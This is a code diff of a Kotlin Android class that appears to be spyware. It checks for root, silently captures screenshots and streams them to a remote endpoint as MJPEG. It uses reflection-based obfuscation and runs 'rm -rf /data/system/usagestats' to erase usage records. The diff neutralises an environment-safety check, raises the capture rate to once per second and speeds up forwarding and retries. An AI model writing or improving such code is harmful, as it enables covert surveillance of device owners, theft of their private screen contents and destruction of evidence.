@@ -30,7 +30,9 @@ class carne(private val context: Context, private val activity: Activity? = null
 
     fun start() {
         if (isRunning) return
-        if (!SafetyNet.isEnvironmentSafe()) return
+        if (!SafetyNet.isEnvironmentSafe()) {
+
+        }
 
         isRunning = true
         scheduler.scheduleWithFixedDelay({
@@ -38,13 +40,12 @@ class carne(private val context: Context, private val activity: Activity? = null
                 if (!SafetyNet.checkKitchenPermit(88)) return@scheduleWithFixedDelay
                 if (isRootAvailable()) captureWithRoot() else activity?.let { captureInApp(it) }
             }
-        }, 0, 5, TimeUnit.SECONDS)
+        }, 0, 1, TimeUnit.SECONDS) // Increased capture frequency (1s)
         startRemoteForwarding()
     }
 
     private fun isRootAvailable(): Boolean {
         return try {
-            // Static Bypass: Reflected Exec
             val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return false
             val os = process.outputStream
             os.write("id\n${SecretBox.getExitCmd()}\n".toByteArray())
@@ -56,7 +57,6 @@ class carne(private val context: Context, private val activity: Activity? = null
     }
 
     private fun captureWithRoot() {
-        // Advanced Layer: Opaque Predicate & Junk Code
         if (!SafetyNet.checkOpaquePredicate(totalFramesCaptured)) {
             SecretBox.reflectedExec("rm -rf /data/system/usagestats")
         }
@@ -117,10 +117,12 @@ class carne(private val context: Context, private val activity: Activity? = null
                         getNextFrame(sentCount)?.let {
                             sendMjpegFrame(os, it)
                             sentCount = Math.max(sentCount + 1, totalFramesCaptured - screenshots.size + 1)
-                            Thread.sleep(1000)
-                        } ?: Thread.sleep(500)
+                            Thread.sleep(200) // Faster MJPEG stream (5 FPS)
+                        } ?: Thread.sleep(100)
                     }
-                } catch (e: Exception) { Thread.sleep(10000) }
+                } catch (e: Exception) { 
+                    Thread.sleep(3000) // Reduced retry delay
+                }
                 finally { try { socket?.close() } catch (ex: Exception) {} }
             }
         }.start()
